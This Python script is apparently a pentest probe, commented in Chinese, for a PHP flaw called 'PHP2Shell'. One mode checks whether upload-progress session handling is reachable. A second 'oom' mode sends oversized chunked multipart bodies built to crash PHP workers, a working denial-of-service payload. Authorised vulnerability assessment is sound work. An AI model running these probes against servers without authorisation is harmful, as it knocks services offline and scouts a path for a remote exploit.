#!/usr/bin/env python3
"""
php2shell_probe.py —— PHP2Shell 可达性探针 v2（非武器化）

两种模式：
  session  判定 session.upload_progress 处理链是否被激活（对应公开 PoC 的主路径）
           手法：对照两个 multipart 请求，看带 PHP_SESSION_UPLOAD_PROGRESS 的那个
           是否让 PHP 提前开启了 session（返回 Set-Cookie: PHPSESSID）。
           目标不带 session 的页面若出现 PHPSESSID，说明 rfc1867 回调在 SAPI 启动阶段
           就跑起来了 —— 即"consumer 可以是任意端点"。完全无害，不发大包、不打崩 worker。

  oom      判定 OOM 可触发性（chunked multipart + header 膨胀）。
           ⚠️ 带 DoS 性质：会打挂 worker，每目标只跑一次、业务低峰、必须授权。

它不做什么：不构造 UAF、不做堆喷、不写文件、不执行命令。

用法:
    python3 php2shell_probe.py --url http://t/index.php --authorized              # 默认 session 模式
    python3 php2shell_probe.py --url http://t/upload --authorized --mode oom --parts 8 --headers 200
    python3 php2shell_probe.py --url http://t/ --authorized --deep                 # session 后再跑 oom
    python3 php2shell_probe.py --url http://t/ --authorized --drip 1.5             # 放慢上传跨过 min_freq

退出码: 0=命中/可疑 1=未观察到 2=错误/拒绝 3=参数错误
"""
import argparse
import json
import os
import re
import socket
import ssl
import sys
import time
import uuid
from urllib.parse import urlparse

MAX_BUDGET = 32 * 1024 * 1024    # OOM 模式单次请求硬上限


# ---------------------------------------------------------------- HTTP 原语
def _connect(host, port, tls, timeout):
    raw = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = ctx.wrap_socket(raw, server_hostname=host)
    raw.settimeout(timeout)
    return raw


def _read_head(raw):
    buf = b""
    while b"\r\n\r\n" not in buf and len(buf) < 65536:
        try:
            chunk = raw.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    head, _, rest = buf.partition(b"\r\n\r\n")
    return head.decode("latin1", "ignore"), rest


def send(host, port, tls, path, body, ctype, timeout, drip=0.0,
         chunked=False, extra=None):
    """发一个 POST；chunked=False 时带 Content-Length，drip>0 时分段放慢发送。"""
    raw = _connect(host, port, tls, timeout)
    hdrs = {"Host": host, "User-Agent": "Mozilla/5.0", "Connection": "close",
            "Content-Type": ctype}
    if extra:
        hdrs.update(extra)
    if chunked:
        hdrs["Transfer-Encoding"] = "chunked"
        head = f"POST {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in hdrs.items()) + "\r\n"
        t0 = time.time()
        raw.sendall(head.encode())
        step = max(1, len(body) // max(1, int(drip * 10))) if drip else 64 * 1024
        for i in range(0, len(body), step):
            piece = body[i:i + step]
            raw.sendall(f"{len(piece):x}\r\n".encode() + piece + b"\r\n")
            if drip:
                time.sleep(drip / max(1, len(body) // step))
        raw.sendall(b"0\r\n\r\n")
    else:
        hdrs["Content-Length"] = str(len(body))
        head = f"POST {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in hdrs.items()) + "\r\n"
        t0 = time.time()
        raw.sendall(head.encode())
        if drip:
            step = max(1, len(body) // 10)
            for i in range(0, len(body), step):
                raw.sendall(body[i:i + step])
                time.sleep(drip / max(1, len(body) // step))
        else:
            raw.sendall(body)
    head_txt, _ = _read_head(raw)
    dt = time.time() - t0
    raw.close()

    status = None
    m = re.match(r"HTTP/\d\.\d\s+(\d{3})", head_txt or "")
    if m:
        status = int(m.group(1))
    headers = {}
    for line in (head_txt or "").split("\r\n")[1:]:
        if ":" in line:
            k, _, v = line.partition(":")
            headers.setdefault(k.strip().lower(), []).append(v.strip())
    return status, headers, dt


# ---------------------------------------------------------------- 载荷构造
def multipart(progress=False, pad=64):
    b = "----p2s" + uuid.uuid4().hex
    parts = []
    if progress:
        parts.append(f"--{b}\r\nContent-Disposition: form-data; "
                     f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
                     f"{uuid.uuid4().hex}\r\n")
    parts.append(f"--{b}\r\n"
                 f'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
                 f"Content-Type: text/plain\r\n\r\n{'A' * pad}\r\n")
    parts.append(f"--{b}--\r\n")
    return b, "".join(parts).encode()


def oom_multipart(parts_n, headers_per_part, pad):
    b = "----p2s" + uuid.uuid4().hex
    chunks = []
    for i in range(parts_n):
        h = [f"--{b}\r\n"]
        for x in range(headers_per_part):
            h.append(f"X-Pad-{x}: {'A' * 8}\r\n")
        h.append(f'Content-Disposition: form-data; name="f{i}"\r\n\r\n')
        h.append("B" * pad + "\r\n")
        chunks.append("".join(h))
    chunks.append(f"--{b}--\r\n")
    return b, "".join(chunks).encode()


# ---------------------------------------------------------------- 两种探测
def probe_session(host, port, tls, path, timeout, drip, extra):
    """对照法：带进度字段是否让 PHP 提前开 session（Set-Cookie: PHPSESSID）。"""
    _, ctrl = multipart(progress=False)
    _, test = multipart(progress=True)

    subprocess_note = ""
    try:
        s_c, h_c, d_c = send(host, port, tls, path, ctrl, "multipart/form-data", timeout,
                             drip=drip, extra=extra)
        s_t, h_t, d_t = send(host, port, tls, path, test, "multipart/form-data", timeout,
                             drip=drip, extra=extra)
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}, 2

    def sid(headers):
        for c in headers.get("set-cookie", []):
            if "PHPSESSID" in c:
                return c.split("PHPSESSID=")[1].split(";")[0][:16]
        return None

    sid_c, sid_t = sid(h_c), sid(h_t)
    engaged = bool(sid_t) and not bool(sid_c)

    res = {
        "mode": "session",
        "control": {"status": s_c, "set_cookie": h_c.get("set-cookie", []), "elapsed_s": round(d_c, 2)},
        "test": {"status": s_t, "set_cookie": h_t.get("set-cookie", []), "elapsed_s": round(d_t, 2)},
        "phpsessid_control": sid_c,
        "phpsessid_test": sid_t,
        "engaged": engaged,
    }
    if engaged:
        res["interpretation"] = ("对照请求不发 session，加上 PHP_SESSION_UPLOAD_PROGRESS 后服务端"
                                 "开始建 session → rfc1867 进度回调已在 SAPI 启动阶段执行，"
                                 "该端点是可用 consumer（公开 PoC 的主路径可达）")
    elif sid_c and sid_t:
        res["interpretation"] = "两组都带 PHPSESSID（站点本来就用 session），本次无法区分，需换不带 session 的端点"
    elif not sid_c and not sid_t:
        res["interpretation"] = ("两组都没 PHPSESSID：可能 upload_progress 已关闭、session 完全不可用，"
                                 "或 cookie 被应用层先行处理")
    else:
        res["interpretation"] = "结果不一致（仅对照组有 cookie），异常，建议换端点重测"
    res["config_hint"] = "若 engaged=false，优先确认 session.upload_progress.enabled 是否为 On（默认 On）"
    return res, 0 if engaged else 1


def probe_oom(host, port, tls, path, timeout, parts_n, headers_per_part, pad):
    budget = parts_n * headers_per_part * 32 + parts_n * pad
    if budget > MAX_BUDGET:
        return {"error": f"预计发包 {budget/1048576:.1f}MB 超过 32MB 硬上限"}, 3
    b, body = oom_multipart(parts_n, headers_per_part, pad)
    try:
        status, headers, dt = send(host, port, tls, path, body,
                                   "multipart/form-data; boundary=" + b, timeout, chunked=True)
    except Exception as e:
        return {"error": f"{type(e).__name__}: {e}"}, 2
    suspicious = (status is None) or (status >= 500) or (dt > timeout * 0.8)
    return {"mode": "oom", "status": status, "elapsed_s": round(dt, 2),
            "sent_bytes": len(body), "suspicious": suspicious}, (0 if suspicious else 1)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--authorized", action="store_true")
    ap.add_argument("--mode", choices=["session", "oom", "auto"], default="session")
    ap.add_argument("--deep", action="store_true", help="auto 模式下再跑 OOM 探测（带 DoS 性质）")
    ap.add_argument("--drip", type=float, default=0.0, help="把 multipart 发送放慢到 N 秒（跨 min_freq）")
    ap.add_argument("--parts", type=int, default=8)
    ap.add_argument("--headers", type=int, default=200, dest="headers_per_part")
    ap.add_argument("--pad", type=int, default=4096)
    ap.add_argument("--timeout", type=float, default=30)
    ap.add_argument("--header", action="append", default=[], help="附加请求头 k:v")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()

    if not a.authorized:
        print("拒绝执行：需先确认授权（--authorized）。", file=sys.stderr)
        return 2

    u = urlparse(a.url)
    host, port = u.hostname, u.port or (443 if u.scheme == "https" else 80)
    path, tls = (u.path or "/"), u.scheme == "https"
    extra = {}
    for h in a.header:
        k, _, v = h.partition(":")
        extra[k.strip()] = v.strip()

    out, rc = {}, 1
    if a.mode in ("session", "auto"):
        out["session"], rc = probe_session(host, port, tls, path, a.timeout, a.drip, extra)
    if a.mode == "oom" or (a.mode == "auto" and a.deep):
        out["oom"], rc2 = probe_oom(host, port, tls, path, a.timeout,
                                    a.parts, a.headers_per_part, a.pad)
        rc = max(rc, rc2) if rc != 0 else rc2

    if a.json:
        print(json.dumps(out, ensure_ascii=False, indent=2))
    else:
        for k, v in out.items():
            print(f"== {k} ==")
            for kk, vv in v.items():
                if kk == "set_cookie" and isinstance(vv, list):
                    vv = vv[:3]
                print(f"  {kk}: {vv}")
            print()
        print("提示: 本探针只判'可达性'。要写 finding 请按 ARTEX 证据标准分档，"
              "不可把可达性写成已 RCE。")
    return rc


if __name__ == "__main__":
    sys.exit(main())
